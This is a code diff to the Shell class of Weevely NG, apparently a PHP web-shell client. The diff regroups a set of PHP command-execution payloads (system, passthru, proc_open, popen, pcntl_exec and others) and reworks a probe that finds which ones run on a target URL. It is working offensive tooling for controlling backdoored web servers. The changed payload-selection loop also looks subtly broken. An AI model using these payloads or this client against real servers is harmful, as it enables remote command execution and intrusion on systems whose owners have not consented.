@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 # This file is part of Weevely NG.
 #
 # Copyright(c) 2011-2012 Weevely Developers
@@ -18,21 +19,25 @@
 import random
 from http.cmdrequest import CmdRequest
 
-class Shell:	
-	# name => payload
-	vectors = { "system()"       : "@system('%s 2>&1');", 
-				"passthru()"     : "passthru('%s 2>&1');", 
-				"popen()"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);", 
-				"exec()"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));", 
+class Shell:
+	# name => payload.
+	vectors = [ { "system()"       : "@system('%s 2>&1');",
+				"passthru()"     : "passthru('%s 2>&1');",
+				"shell_exec()"   : "echo shell_exec('%s 2>&1');"
+			  },
+
+			  {
 			    "proc_open()"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
 							       "$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));" + \
 								   "while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);" + \
-								   "fclose($pipes[2]); proc_close($h);", 
-				"shell_exec()"   : "echo shell_exec('%s 2>&1');", 
-				"pcntl_exec()"   : "$args = array('%s'); pcntl_exec( '%s', $args );", 
-				"perl->system()" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;", 
-				"python_eval()"  : "@python_eval('import os; os.system('%s 2>&1');"
-			  }
+								   "fclose($pipes[2]); proc_close($h);",
+				"popen()"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);",
+				"python_eval()"  : "@python_eval('import os; os.system('%s 2>&1');",
+				"pcntl_exec()"   : "$args = array('%s'); pcntl_exec( '%s', $args );",
+				"perl->system()" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;",
+				"exec()"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
+			    }
+		    ]
 
 	def __init__( self, url, password ):
 		self.url 	  = url
@@ -45,19 +50,25 @@ class Shell:
 		if self.allowed == []:
 			raise Exception( "No allowed functions found on %s." % self.url )
 		else:
-			self.payload = self.vectors[ self.allowed[0] ]
+			for vect in self.vectors:
+			  self.payload = vect[ self.allowed[0] ]
+			  break
+
 			print "+ Using method '%s' ." % self.allowed[0]
 
-	def __searchAllowedPayloads( self ):
-		for name, payload in self.vectors.items():
-			try:
-				rand     = random.randint( 11111, 99999 )
-				response = self.execute( "echo %d" % rand, self.vectors[name] )
+	def __searchAllowedPayloads( self,  ):
 
-				if response == str(rand):
-					self.allowed.append(name)
-			except:	
-				pass
+		for vect in self.vectors:
+
+		  for name, payload in vect.items():
+			  try:
+				  rand     = random.randint( 11111, 99999 )
+				  response = self.execute( "echo %d" % rand, vect[name] )
+
+				  if response == str(rand):
+					  self.allowed.append(name)
+			  except:
+				  pass
 
 	def execute( self, cmd, payload = None ):
 		if payload == None:
